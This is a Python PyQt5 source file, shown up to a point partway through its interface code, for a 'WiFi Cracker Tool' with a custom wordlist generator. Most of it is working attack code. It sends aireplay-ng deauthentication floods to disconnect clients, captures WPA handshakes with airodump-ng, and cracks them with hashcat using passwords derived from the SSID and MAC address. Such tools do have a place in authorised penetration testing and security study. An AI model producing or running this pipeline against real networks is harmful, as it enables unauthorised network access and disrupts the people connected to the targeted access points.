import sys
import subprocess
import time
import os
import select
import glob
import re
import itertools
from datetime import datetime
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QPushButton, QLabel,
    QListWidget, QMessageBox, QTextEdit, QHBoxLayout, QLineEdit,
    QSpinBox, QFileDialog, QDialog, QComboBox, QDialogButtonBox,
    QCheckBox, QGroupBox, QProgressBar, QTabWidget
)
from PyQt5.QtCore import QThread, pyqtSignal

WORDLIST_DEFAULT = "wordlist.txt"
CAPTURE_TIME = 60  # seconds
CAPTURE_DIR = "/home/kali/rgsecu-pentest/tesUI"
INTERFACE = None  # Will be set at runtime


def run_command(cmd):
    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout, result.stderr
    except Exception as e:
        return "", str(e)


def get_latest_cap_file(prefix):
    cap_files = glob.glob(f"{prefix}-*.cap")
    if not cap_files:
        return None
    return max(cap_files, key=os.path.getctime)


def get_wireless_interfaces():
    """Get wireless interfaces using multiple methods for better compatibility"""
    interfaces = []
    
    # Method 1: Using iw (modern approach)
    try:
        output, _ = run_command(["iw", "dev"])
        for line in output.splitlines():
            if "Interface" in line:
                iface = line.split()[-1]
                interfaces.append(iface)
    except:
        pass
    
    # Method 2: Using iwconfig (legacy)
    if not interfaces:
        try:
            output, _ = run_command(["iwconfig"])
            for line in output.splitlines():
                if "IEEE 802.11" in line:
                    iface = line.split()[0]
                    interfaces.append(iface)
        except:
            pass
    
    # Method 3: Check /sys/class/net for wireless interfaces
    if not interfaces:
        try:
            for iface in os.listdir('/sys/class/net/'):
                wireless_path = f'/sys/class/net/{iface}/wireless'
                if os.path.exists(wireless_path):
                    interfaces.append(iface)
        except:
            pass
    
    # Method 4: Manual fallback - add common interface names
    if not interfaces:
        common_names = ['wlan0', 'wlan1', 'wlo1', 'wlp2s0', 'wlp3s0']
        try:
            output, _ = run_command(["ip", "link", "show"])
            for name in common_names:
                if name in output:
                    interfaces.append(name)
        except:
            pass
    
    return list(set(interfaces))  # Remove duplicates


class WiFiWordlistGenerator:
    def __init__(self):
        # Common password patterns and suffixes
        self.common_suffixes = [
            '123', '1234', '12345', '123456', '1234567', '12345678',
            '321', '4321', '54321', '654321', '7654321', '87654321',
            '2023', '2024', '2025', '2022', '2021', '2020',
            '01', '02', '03', '04', '05', '06', '07', '08', '09', '10',
            '11', '12', '13', '14', '15', '16', '17', '18', '19', '20',
            'admin', 'password', 'pass', 'wifi', 'internet', 'home',
            '!', '@', '#', '$', '%', '&', '*', '+', '=', '_', '-'
        ]
        
        self.common_prefixes = [
            'wifi', 'home', 'house', 'family', 'office', 'work', 'admin',
            'guest', 'user', 'net', 'network', 'internet', 'router'
        ]
    
    def extract_base_words(self, ssid):
        """Extract meaningful words from SSID"""
        # Remove common prefixes and suffixes
        ssid_clean = re.sub(r'[-_\s]+', '', ssid.lower())
        
        # Remove numbers to get base word
        base_word = re.sub(r'\d+', '', ssid_clean)
        
        # Extract numbers separately
        numbers = re.findall(r'\d+', ssid)
        
        words = []
        
        # Add original SSID variations
        words.extend([ssid, ssid.lower(), ssid.upper(), ssid.title()])
        
        # Add cleaned versions
        if base_word and len(base_word) > 2:
            words.extend([base_word, base_word.upper(), base_word.title()])
        
        # Add number combinations
        words.extend(numbers)
        
        # Split on common separators
        for separator in ['-', '_', ' ', '.']:
            if separator in ssid:
                parts = ssid.split(separator)
                for part in parts:
                    if len(part) > 2:
                        words.extend([part, part.lower(), part.upper(), part.title()])
        
        return list(set(words))
    
    def generate_variations(self, word):
        """Generate common variations of a word"""
        variations = []
        
        # Original word
        variations.append(word)
        
        # Case variations
        variations.extend([word.lower(), word.upper(), word.title()])
        
        # Leet speak substitutions
        leet_map = {
            'a': ['@', '4'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'],
            's': ['$', '5'], 't': ['7'], 'l': ['1'], 'g': ['9']
        }
        
        leet_word = word.lower()
        for char, replacements in leet_map.items():
            for replacement in replacements:
                variations.append(leet_word.replace(char, replacement))
        
        # Add with common suffixes
        for suffix in self.common_suffixes:
            variations.extend([
                word + suffix,
                word.lower() + suffix,
                word.upper() + suffix,
                suffix + word,
                suffix + word.lower()
            ])
        
        return variations
    
    def generate_mac_based_passwords(self, bssid):
        """Generate passwords based on MAC address patterns"""
        passwords = []
        
        # Remove colons and get clean MAC
        mac_clean = bssid.replace(':', '').lower()
        
        # Common MAC-based patterns
        passwords.extend([
            mac_clean,
            mac_clean.upper(),
            mac_clean[-6:],  # Last 6 characters
            mac_clean[-8:],  # Last 8 characters
            mac_clean[:6],   # First 6 characters
            mac_clean[:8]    # First 8 characters
        ])
        
        # MAC with common suffixes
        for suffix in ['123', '1234', '12345', 'admin', 'wifi']:
            passwords.extend([
                mac_clean[-6:] + suffix,
                mac_clean[-8:] + suffix,
                suffix + mac_clean[-6:],
                suffix + mac_clean[-8:]
            ])
        
        return passwords
    
    def generate_common_passwords(self):
        """Generate list of most common WiFi passwords"""
        return [
            'password', 'admin', '12345678', '123456789', '1234567890',
            'qwerty123', 'password123', 'admin123', 'router123',
            'wifi123', 'internet', 'welcome', 'changeme', 'default',
            '00000000', '11111111', '12345678', '87654321',
            'password1', 'password12', 'password123', 'password1234',
            'adminadmin', 'administrator', 'welcome123', 'guest123',
            'homeuser', 'homewifi', 'familywifi', 'mywifi',
            'linksys', 'netgear', 'dlink', 'tplink', 'wireless'
        ]
    
    def generate_wordlist(self, ssid, bssid, channel, include_common=True, max_length=10000):
        """Generate complete wordlist for a specific network"""
        all_passwords = set()
        
        # Extract base words from SSID
        base_words = self.extract_base_words(ssid)
        
        # Generate variations for each base word
        for word in base_words:
            if len(word) >= 3:  # Only process words with 3+ characters
                variations = self.generate_variations(word)
                all_passwords.update(variations)
        
        # Add MAC-based passwords
        mac_passwords = self.generate_mac_based_passwords(bssid)
        all_passwords.update(mac_passwords)
        
        # Add common passwords if requested
        if include_common:
            common_passwords = self.generate_common_passwords()
            all_passwords.update(common_passwords)
        
        # Filter and clean up
        filtered_passwords = []
        for pwd in all_passwords:
            if pwd and 8 <= len(pwd) <= 63:  # WPA length requirements
                if not re.match(r'^[^a-zA-Z0-9]*$', pwd):
                    filtered_passwords.append(pwd)
        
        # Sort by likelihood
        filtered_passwords.sort(key=lambda x: (len(x), x.lower()))
        
        # Limit to max_length
        if len(filtered_passwords) > max_length:
            filtered_passwords = filtered_passwords[:max_length]
        
        return filtered_passwords


class WordlistGeneratorDialog(QDialog):
    def __init__(self, ssid, bssid, channel):
        super().__init__()
        self.ssid = ssid
        self.bssid = bssid
        self.channel = channel
        self.generator = WiFiWordlistGenerator()
        self.setupUI()
        
    def setupUI(self):
        self.setWindowTitle("Generate Custom Wordlist")
        self.setFixedSize(500, 400)
        layout = QVBoxLayout()
        
        # Network info
        info_group = QGroupBox("Target Network Information")
        info_layout = QVBoxLayout()
        info_layout.addWidget(QLabel(f"SSID: {self.ssid}"))
        info_layout.addWidget(QLabel(f"BSSID: {self.bssid}"))
        info_layout.addWidget(QLabel(f"Channel: {self.channel}"))
        info_group.setLayout(info_layout)
        layout.addWidget(info_group)
        
        # Options
        options_group = QGroupBox("Generation Options")
        options_layout = QVBoxLayout()
        
        self.include_common_cb = QCheckBox("Include common passwords")
        self.include_common_cb.setChecked(True)
        options_layout.addWidget(self.include_common_cb)
        
        # Max passwords
        max_layout = QHBoxLayout()
        max_layout.addWidget(QLabel("Maximum passwords:"))
        self.max_spin = QSpinBox()
        self.max_spin.setRange(1000, 100000)
        self.max_spin.setValue(10000)
        self.max_spin.setSingleStep(1000)
        max_layout.addWidget(self.max_spin)
        options_layout.addLayout(max_layout)
        
        options_group.setLayout(options_layout)
        layout.addWidget(options_group)
        
        # Preview
        preview_group = QGroupBox("Preview (First 20 passwords)")
        preview_layout = QVBoxLayout()
        self.preview_text = QTextEdit()
        self.preview_text.setMaximumHeight(150)
        self.preview_text.setReadOnly(True)
        preview_layout.addWidget(self.preview_text)
        
        self.generate_preview_btn = QPushButton("Generate Preview")
        self.generate_preview_btn.clicked.connect(self.generate_preview)
        preview_layout.addWidget(self.generate_preview_btn)
        
        preview_group.setLayout(preview_layout)
        layout.addWidget(preview_group)
        
        # Save location
        save_layout = QHBoxLayout()
        save_layout.addWidget(QLabel("Save to:"))
        self.save_path_input = QLineEdit()
        self.save_path_input.setText(f"{self.ssid.replace(' ', '_')}_wordlist.txt")
        save_layout.addWidget(self.save_path_input)
        
        self.browse_save_btn = QPushButton("Browse")
        self.browse_save_btn.clicked.connect(self.browse_save_location)
        save_layout.addWidget(self.browse_save_btn)
        layout.addLayout(save_layout)
        
        # Buttons
        buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        buttons.accepted.connect(self.generate_and_save)
        buttons.rejected.connect(self.reject)
        layout.addWidget(buttons)
        
        self.setLayout(layout)
        
        # Generate initial preview
        self.generate_preview()
    
    def generate_preview(self):
        try:
            passwords = self.generator.generate_wordlist(
                self.ssid, self.bssid, self.channel,
                self.include_common_cb.isChecked(),
                min(100, self.max_spin.value())  # Limit preview
            )
            
            preview_text = f"Generated {len(passwords)} passwords (showing first 20):\n\n"
            for i, pwd in enumerate(passwords[:20]):
                preview_text += f"{i+1:2d}. {pwd}\n"
            
            self.preview_text.setText(preview_text)
        except Exception as e:
            self.preview_text.setText(f"Error generating preview: {e}")
    
    def browse_save_location(self):
        path, _ = QFileDialog.getSaveFileName(
            self, "Save Wordlist", self.save_path_input.text(), 
            "Text Files (*.txt);;All Files (*)"
        )
        if path:
            self.save_path_input.setText(path)
    
    def generate_and_save(self):
        try:
            # Generate full wordlist
            passwords = self.generator.generate_wordlist(
                self.ssid, self.bssid, self.channel,
                self.include_common_cb.isChecked(),
                self.max_spin.value()
            )
            
            # Save to file
            save_path = self.save_path_input.text()
            if not save_path:
                QMessageBox.warning(self, "Warning", "Please specify a save location.")
                return
            
            with open(save_path, 'w', encoding='utf-8') as f:
                for password in passwords:
                    f.write(password + '\n')
            
            QMessageBox.information(
                self, "Success", 
                f"Wordlist saved successfully!\n"
                f"Location: {save_path}\n"
                f"Passwords: {len(passwords)}"
            )
            self.accept()
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to generate wordlist: {e}")


class AdapterSelectionDialog(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Select Network Adapter")
        self.setFixedSize(350, 150)
        layout = QVBoxLayout()
        
        # Get interfaces
        interfaces = get_wireless_interfaces()
        
        # If no interfaces found, add common ones manually
        if not interfaces:
            interfaces = ['wlan0', 'wlan1', 'wlo1']
            layout.addWidget(QLabel("⚠️ Auto-detection failed. Common interfaces:"))
        else:
            layout.addWidget(QLabel("Choose a wireless interface:"))
        
        self.combo = QComboBox()
        self.combo.addItems(interfaces)
        layout.addWidget(self.combo)
        
        # Add manual entry option
        layout.addWidget(QLabel("Or enter manually:"))
        self.manual_input = QLineEdit()
        self.manual_input.setPlaceholderText("e.g., wlan0")
        layout.addWidget(self.manual_input)

        buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        buttons.accepted.connect(self.accept)
        buttons.rejected.connect(self.reject)
        layout.addWidget(buttons)

        self.setLayout(layout)

    def selected_interface(self):
        manual = self.manual_input.text().strip()
        return manual if manual else self.combo.currentText()


class ScanThread(QThread):
    networks_found = pyqtSignal(list)
    error = pyqtSignal(str)

    def run(self):
        try:
            subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "down"], check=True)
            subprocess.run(["sudo", "iw", INTERFACE, "set", "monitor", "none"], check=True)
            subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "up"], check=True)
        except Exception as e:
            self.error.emit(f"Failed to set monitor mode: {e}")
            return

        tmp_prefix = "/tmp/airodump_scan"
        try:
            for ext in [".csv", "-01.csv", "-01.kismet.csv", "-01.kismet.netxml"]:
                try:
                    os.remove(tmp_prefix + ext)
                except FileNotFoundError:
                    pass
            proc = subprocess.Popen(
                ["sudo", "airodump-ng", "--band", "abg", "--output-format", "csv", "-w", tmp_prefix, INTERFACE],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(30)
            proc.terminate()
            proc.wait()
        except Exception as e:
            self.error.emit(f"Failed to run airodump-ng: {e}")
            return

        ap_list = []
        csv_file = tmp_prefix + "-01.csv"
        try:
            with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
            for line in lines:
                if "Station MAC" in line:
                    break
                parts = line.strip().split(",")
                if len(parts) > 13:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    ssid = parts[13].strip()
                    if ssid and bssid:
                        ap_list.append((ssid, bssid, channel))
        except Exception as e:
            self.error.emit(f"Failed to parse scan results: {e}")
            return

        try:
            subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "down"], check=True)
            subprocess.run(["sudo", "iw", INTERFACE, "set", "type", "managed"], check=True)
            subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "up"], check=True)
        except Exception as e:
            self.error.emit(f"Failed to restore interface mode: {e}")

        self.networks_found.emit(ap_list)


class CaptureThread(QThread):
    log_signal = pyqtSignal(str)
    finished_signal = pyqtSignal(bool, str)

    def __init__(self, ssid, bssid, channel, wordlist, capture_time):
        super().__init__()
        self.ssid = ssid
        self.bssid = bssid
        self.channel = channel
        self.wordlist = wordlist
        self.capture_time = capture_time
        safe_ssid = self.ssid.replace(' ', '_').replace('/', '_')
        self.capture_prefix = os.path.join(CAPTURE_DIR, f"{safe_ssid}_capture")
        self.hash_file = os.path.join(CAPTURE_DIR, f"{safe_ssid}_hashes.22000")

    def cleanup_temp_files(self):
        """Clean up temporary files"""
        try:
            temp_patterns = [
                "/tmp/verify*.csv",
                "/tmp/verify*.kismet.*",
                "/tmp/verify*.log",
                "/tmp/channel_scan*.csv",
                "/tmp/channel_scan*.kismet.*"
            ]
            for pattern in temp_patterns:
                for file in glob.glob(pattern):
                    try:
                        os.remove(file)
                    except:
                        pass
        except:
            pass

    def set_monitor_mode(self):
        """Set interface to monitor mode"""
        try:
            self.log_signal.emit("Setting interface to monitor mode...")
            subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "down"], 
                         check=True, capture_output=True)
            subprocess.run(["sudo", "iw", INTERFACE, "set", "monitor", "none"], 
                         check=True, capture_output=True)
            subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "up"], 
                         check=True, capture_output=True)
            
            # Wait a moment for interface to come up
            time.sleep(2)
            return True
        except subprocess.CalledProcessError as e:
            self.log_signal.emit(f"Failed to set monitor mode: {e}")
            return False
        except Exception as e:
            self.log_signal.emit(f"Error setting monitor mode: {e}")
            return False

    def restore_managed_mode(self):
        """Restore interface to managed mode"""
        try:
            self.log_signal.emit("Restoring interface to managed mode...")
            subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "down"], 
                         capture_output=True)
            subprocess.run(["sudo", "iw", INTERFACE, "set", "type", "managed"], 
                         capture_output=True)
            subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "up"], 
                         capture_output=True)
        except Exception as e:
            self.log_signal.emit(f"Warning: Failed to restore managed mode: {e}")

    def set_channel(self, channel):
        """Set interface to specific channel"""
        try:
            self.log_signal.emit(f"Setting channel to {channel}...")
            result = subprocess.run(
                ["sudo", "iw", INTERFACE, "set", "channel", str(channel)], 
                capture_output=True, text=True
            )
            if result.returncode != 0:
                self.log_signal.emit(f"Channel set error: {result.stderr}")
                return False
            
            # Verify channel setting
            time.sleep(1)
            verify_result = subprocess.run(
                ["iw", INTERFACE, "info"], 
                capture_output=True, text=True
            )
            
            if f"channel {channel}" in verify_result.stdout or f"freq" in verify_result.stdout:
                self.log_signal.emit(f"Successfully set to channel {channel}")
                return True
            else:
                self.log_signal.emit(f"Channel verification failed for {channel}")
                return False
                
        except Exception as e:
            self.log_signal.emit(f"Error setting channel {channel}: {e}")
            return False

    def scan_for_target(self, channel, duration=8):
        """Scan for target on specific channel"""
        try:
            scan_file = f"/tmp/channel_scan_{channel}"
            
            # Clean up old scan files
            for ext in [".csv", "-01.csv", "-01.kismet.csv", "-01.kismet.netxml"]:
                try:
                    os.remove(scan_file + ext)
                except FileNotFoundError:
                    pass
            
            # Start scan
            scan_proc = subprocess.Popen(
                ["sudo", "airodump-ng", "-c", str(channel), "--write-interval", "2",
                 "--output-format", "csv", "-w", scan_file, INTERFACE],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            
            time.sleep(duration)
            scan_proc.terminate()
            try:
                scan_proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                scan_proc.kill()
                scan_proc.wait()
            
            # Check if target found
            csv_file = scan_file + "-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                    if self.bssid.upper() in content.upper():
                        self.log_signal.emit(f"✓ Target {self.bssid} found on channel {channel}")
                        return True
            
            return False
            
        except Exception as e:
            self.log_signal.emit(f"Error scanning channel {channel}: {e}")
            return False

    def find_correct_channel(self):
        """Find the correct channel for target AP"""
        self.log_signal.emit(f"Searching for target {self.bssid}...")
        
        # First try the provided channel
        if self.set_channel(self.channel):
            if self.scan_for_target(self.channel, 10):
                return self.channel
        
        # If not found, try common channels based on original channel
        try:
            original_channel = int(self.channel)
        except:
            original_channel = 1
        
        if original_channel <= 14:
            # 2.4GHz channels
            search_channels = [1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13, 14]
        else:
            # 5GHz channels
            search_channels = [36, 40, 44, 48, 149, 153, 157, 161, 165, 
                             52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140]
        
        # Remove original channel from search list if it's there
        if original_channel in search_channels:
            search_channels.remove(original_channel)
        
        # Prioritize channels close to original
        if original_channel <= 14:
            search_channels.sort(key=lambda x: abs(x - original_channel))
        
        self.log_signal.emit(f"Target not found on channel {self.channel}, scanning other channels...")
        
        for channel in search_channels:
            self.log_signal.emit(f"Trying channel {channel}...")
            if self.set_channel(channel):
                if self.scan_for_target(channel, 6):
                    self.log_signal.emit(f"Found target on channel {channel}!")
                    return str(channel)
        
        self.log_signal.emit("Target not found on any channel. Proceeding with original channel...")
        return self.channel

    def send_deauth_packets(self, count=15):
        """Send deauth packets to force handshake"""
        try:
            self.log_signal.emit(f"Sending {count} deauth packets to {self.bssid}...")
            
            # Method 1: Deauth all clients
            cmd1 = ["sudo", "aireplay-ng", "--deauth", str(count), "-a", self.bssid, INTERFACE]
            proc1 = subprocess.Popen(cmd1, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            
            # Wait a bit then send targeted deauth
            time.sleep(3)
            
            # Method 2: Broadcast deauth 
            cmd2 = ["sudo", "aireplay-ng", "--deauth", str(count//2), "-a", self.bssid, 
                   "-c", "FF:FF:FF:FF:FF:FF", INTERFACE]
            proc2 = subprocess.Popen(cmd2, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            
            # Wait for both to complete
            proc1.wait()
            proc2.wait()
            
            self.log_signal.emit("Deauth packets sent successfully")
            return True
            
        except Exception as e:
            self.log_signal.emit(f"Error sending deauth packets: {e}")
            return False

    def start_capture_process(self):
        """Start the airodump-ng capture process"""
        try:
            self.log_signal.emit(f"Starting capture on channel {self.channel} for BSSID {self.bssid}...")
            
            airodump_cmd = [
                "sudo", "airodump-ng",
                "-c", self.channel,
                "--bssid", self.bssid,
                "--write-interval", "1",
                "-w", self.capture_prefix,
                INTERFACE
            ]
            
            airodump_proc = subprocess.Popen(
                airodump_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            return airodump_proc
            
        except Exception as e:
            self.log_signal.emit(f"Error starting capture: {e}")
            return None

    def monitor_for_handshake(self, airodump_proc):
        """Monitor airodump output for handshake capture"""
        handshake_detected = False
        start_time = time.time()
        last_deauth_time = 0
        deauth_interval = 20  # Send deauth every 20 seconds
        
        self.log_signal.emit(f"Monitoring for handshake (timeout: {self.capture_time}s)...")
        
        while time.time() - start_time < self.capture_time:
            try:
                # Check if process is still running
                if airodump_proc.poll() is not None:
                    self.log_signal.emit("Airodump process terminated unexpectedly")
                    break
                
                # Send periodic deauth packets
                current_time = time.time()
                if current_time - last_deauth_time >= deauth_interval:
                    self.log_signal.emit("Sending periodic deauth packets...")
                    self.send_deauth_packets(8)
                    last_deauth_time = current_time
                
                # Read output from airodump
                reads, _, _ = select.select([airodump_proc.stdout], [], [], 2)
                if airodump_proc.stdout in reads:
                    line = airodump_proc.stdout.readline()
                    if line:
                        line_clean = line.strip()
                        if line_clean:
                            self.log_signal.emit(f"Airodump: {line_clean}")
                        
                        # Check for handshake indicators
                        if any(keyword in line.upper() for keyword in 
                               ['WPA HANDSHAKE', 'HANDSHAKE', 'EAPOL', 'WPA']):
                            handshake_detected = True
                            self.log_signal.emit("🎉 Handshake detected!")
                
                # Check capture file for handshake
                if not handshake_detected:
                    capture_file = get_latest_cap_file(self.capture_prefix)
                    if capture_file and os.path.exists(capture_file):
                        # Quick check file size - if growing, something is being captured
                        file_size = os.path.getsize(capture_file)
                        if file_size > 50000:  # Reasonable size for handshake
                            # Try a quick conversion test
                            test_hash = f"/tmp/test_handshake_{int(time.time())}.22000"
                            try:
                                result = subprocess.run([
                                    "hcxpcapngtool", "--all", "-o", test_hash, capture_file
                                ], capture_output=True, text=True, timeout=10)
                                
                                if os.path.exists(test_hash) and os.path.getsize(test_hash) > 0:
                                    handshake_detected = True
                                    self.log_signal.emit("🎉 Handshake detected in capture file!")
                                    try:
                                        os.remove(test_hash)
                                    except:
                                        pass
                            except:
                                pass
                
                time.sleep(1)
                
            except Exception as e:
                self.log_signal.emit(f"Error monitoring capture: {e}")
                break
        
        return handshake_detected

    def convert_to_hashcat_format(self):
        """Convert capture file to hashcat format"""
        try:
            # Find the latest capture file
            self.capture_file = get_latest_cap_file(self.capture_prefix)
            if not self.capture_file or not os.path.exists(self.capture_file):
                self.log_signal.emit("❌ No capture file found")
                return False
            
            file_size = os.path.getsize(self.capture_file)
            self.log_signal.emit(f"Converting capture file: {self.capture_file} ({file_size} bytes)")
            
            if file_size < 1000:
                self.log_signal.emit("⚠️ Capture file seems too small")
            
            # Convert using hcxpcapngtool
            cmd_convert = [
                "hcxpcapngtool",
                "--all", 
                "-o", self.hash_file,
                self.capture_file
            ]
            
            self.log_signal.emit("Converting to hashcat format...")
            result = subprocess.run(cmd_convert, capture_output=True, text=True, timeout=30)
            
            if result.stdout:
                self.log_signal.emit(f"Converter output: {result.stdout}")
            if result.stderr:
                self.log_signal.emit(f"Converter warnings: {result.stderr}")
            
            if not os.path.exists(self.hash_file):
                self.log_signal.emit("❌ Hash file was not created")
                return False
            
            hash_size = os.path.getsize(self.hash_file)
            if hash_size == 0:
                self.log_signal.emit("❌ Hash file is empty - no handshake found")
                return False
            
            self.log_signal.emit(f"✓ Hash file created: {self.hash_file} ({hash_size} bytes)")
            return True
            
        except subprocess.TimeoutExpired:
            self.log_signal.emit("❌ Conversion timeout - file may be corrupted")
            return False
        except Exception as e:
            self.log_signal.emit(f"❌ Conversion error: {e}")
            return False

    def crack_with_hashcat(self):
        """Crack the password using hashcat"""
        try:
            if not os.path.exists(self.wordlist):
                self.log_signal.emit(f"❌ Wordlist not found: {self.wordlist}")
                return False
            
            wordlist_size = sum(1 for _ in open(self.wordlist, 'r', encoding='utf-8', errors='ignore'))
            self.log_signal.emit(f"Starting hashcat with {wordlist_size} passwords...")
            
            cmd_hashcat = [
                "hashcat",
                "-m", "22000",
                self.hash_file,
                self.wordlist,
                "--force",
                "--potfile-disable",
                "--quiet"
            ]
            
            self.log_signal.emit("🔓 Cracking in progress...")
            
            proc = subprocess.Popen(
                cmd_hashcat,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            password_found = False
            while True:
                line = proc.stdout.readline()
                if not line:
                    break
                
                line_clean = line.strip()
                if line_clean:
                    self.log_signal.emit(f"Hashcat: {line_clean}")
                    
                    # Check for cracked password
                    if ':' in line_clean and len(line_clean.split(':')) >= 2:
                        # This might be the cracked password line
                        if self.bssid.replace(':', '').lower() in line_clean.lower():
                            password = line_clean.split(':')[-1].strip()
                            if len(password) >= 8:  # Valid WPA password length
                                self.log_signal.emit(f"🎉 PASSWORD FOUND: {password}")
                                password_found = True
            
            proc.wait()
            
            if proc.returncode == 0 and not password_found:
                self.log_signal.emit("✓ Hashcat completed successfully")
            elif not password_found:
                self.log_signal.emit("❌ Password not found in wordlist")
            
            return password_found
            
        except Exception as e:
            self.log_signal.emit(f"❌ Hashcat error: {e}")
            return False

    def run(self):
        """Main thread execution"""
        try:
            # Clean up old files
            self.cleanup_temp_files()
            os.makedirs(CAPTURE_DIR, exist_ok=True)
            
            # Remove old capture files
            for f in glob.glob(f"{self.capture_prefix}-*.cap") + [self.hash_file]:
                try:
                    os.remove(f)
                except FileNotFoundError:
                    pass
            
            # Set monitor mode
            if not self.set_monitor_mode():
                self.finished_signal.emit(False, "Failed to set monitor mode")
                return
            
            # Find correct channel
            correct_channel = self.find_correct_channel()
            if correct_channel != self.channel:
                self.channel = correct_channel
            
            # Set final channel
            if not self.set_channel(self.channel):
                self.finished_signal.emit(False, f"Failed to set channel {self.channel}")
                return
            
            # Start capture process
            airodump_proc = self.start_capture_process()
            if not airodump_proc:
                self.finished_signal.emit(False, "Failed to start capture process")
                return
            
            # Send initial deauth
            time.sleep(3)
            self.send_deauth_packets(10)
            
            # Monitor for handshake
            handshake_found = self.monitor_for_handshake(airodump_proc)
            
            # Stop airodump
            self.log_signal.emit("Stopping capture...")
            airodump_proc.terminate()
            try:
                airodump_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                airodump_proc.kill()
                airodump_proc.wait()
            
            # Convert to hashcat format
            if not self.convert_to_hashcat_format():
                self.restore_managed_mode()
                self.finished_signal.emit(False, "Failed to convert capture or no handshake found")
                return
            
            # Crack with hashcat
            password_found = self.crack_with_hashcat()
            
            # Restore managed mode
            self.restore_managed_mode()
            self.cleanup_temp_files()
            
            if password_found:
                self.finished_signal.emit(True, "🎉 Password successfully cracked! Check the logs above.")
            else:
                self.finished_signal.emit(True, "Capture completed but password not found in wordlist. Try a larger wordlist.")
                
        except Exception as e:
            self.log_signal.emit(f"❌ Critical error: {e}")
            self.restore_managed_mode()
            self.cleanup_temp_files()
            self.finished_signal.emit(False, f"Critical error: {e}")


class WiFiCrackerApp(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("WiFi Cracker Tool with Custom Wordlist Generator")
        self.setGeometry(100, 100, 800, 700)
        self.layout = QVBoxLayout()

        # Create tab widget
        self.tab_widget = QTabWidget()
        
        # Main tab
        main_tab = QWidget()
        main_layout = QVBoxLayout()
        
        self.label = QLabel("Available Networks (SSID | BSSID | Channel | Band):")
        main_layout.addWidget(self.label)

        self.network_list = QListWidget()
        main_layout.addWidget(self.network_list)

        # Button layout
        btn_layout = QHBoxLayout()
        self.refresh_button = QPushButton("Refresh Networks")
        self.refresh_button.clicked.connect(self.scan_networks)
        btn_layout.addWidget(self.refresh_button)

        self.generate_wordlist_button = QPushButton("Generate Custom Wordlist")
        self.generate_wordlist_button.clicked.connect(self.generate_custom_wordlist)
        btn_layout.addWidget(self.generate_wordlist_button)

        self.capture_button = QPushButton("Capture & Crack")
        self.capture_button.clicked.connect(self.start_capture)
        btn_layout.addWidget(self.capture_button)

        main_layout.addLayout(btn_layout)

        # Wordlist selection
        wordlist_group = QGroupBox("Wordlist Configuration")
        wordlist_layout = QVBoxLayout()
        
        self.wordlist_label = QLabel("Wordlist Path:")
        wordlist_layout.addWidget(self.wordlist_label)

        wl_layout = QHBoxLayout()
        self.wordlist_input = QLineEdit(WORDLIST_DEFAULT)
        wl_layout.addWidget(self.wordlist_input)

        self.browse_button = QPushButton("Browse")
        self.browse_button.clicked.connect(self.browse_wordlist)
        wl_layout.addWidget(self.browse_button)

        wordlist_layout.addLayout(wl_layout)
        wordlist_group.setLayout(wordlist_layout)
        main_layout.addWidget(wordlist_group)

        # Capture settings
        settings_group = QGroupBox("Capture Settings")
        settings_layout = QVBoxLayout()
        
        self.capture_time_label = QLabel("Capture Time (seconds):")
        settings_layout.addWidget(self.capture_time_label)

        self.capture_time_spin = QSpinBox()
        self.capture_time_spin.setRange(10, 300)
        self.capture_time_spin.setValue(CAPTURE_TIME)
        settings_layout.addWidget(self.capture_time_spin)
        
        settings_group.setLayout(settings_layout)
        main_layout.addWidget(settings_group)

        # Logs
        self.log_label = QLabel("Logs:")
        main_layout.addWidget(self.log_label)

        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        main_layout.addWidget(self.log_text)

        main_tab.setLayout(main_layout)
        self.tab_widget.addTab(main_tab, "Main")
        
        # Wordlist Generator tab
        wordlist_tab = QWidget()
        wordlist_tab_layout = QVBoxLayout()
        
        # Instructions
        instructions = QLabel("""
Custom Wordlist Generator Instructions:

1. Select a network from the main tab
2. Click 'Generate Custom Wordlist' to create targeted passwords
3. The generator will create passwords based on:
   - Network name (SSID) variations
   - MAC address patterns
   - Common WiFi passwords
   - Leet speak variations
   - Number combinations

4. Generated wordlists are typically more effective than generic ones
5. Use the generated wordlist in the 'Wordlist Path' field
        """)
        instructions.setWordWrap(True)
        instructions.setStyleSheet("QLabel { background-color: #f0f0f0; padding: 10px; border-radius: 5px; }")
        wordlist_tab_layout.addWidget(instructions)
        
        # Quick wordlist generation
        quick_group = QGroupBox("Quick Wordlist Generation")
        quick_layout = QVBoxLayout()
        
        quick_layout.addWidget(QLabel("Generate wordlist for selected network:"))
        
        quick_btn_layout = QHBoxLayout()
